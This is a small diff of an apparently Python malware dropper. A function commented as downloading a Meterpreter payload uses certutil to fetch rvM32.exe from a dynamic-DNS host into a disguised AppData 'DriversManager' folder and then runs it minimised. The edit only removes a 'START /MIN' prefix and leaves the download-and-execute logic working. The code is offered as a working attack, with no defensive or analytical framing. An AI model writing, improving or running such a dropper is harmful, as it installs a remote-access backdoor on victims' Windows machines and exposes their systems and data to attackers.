@@ -10,7 +10,7 @@ current_user = os.environ["USERNAME"]
 
 # FUNCTION TO DOWNLOAD METERPRETER PAYLOAD
 def dwnExec():
-    dwn = 'START /MIN certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe"'.format(letter_drive, current_user)
+    dwn = 'certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe"'.format(letter_drive, current_user)
     os.system(dwn)
     try:
         exc = "START /MIN {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe".format(letter_drive, current_user)
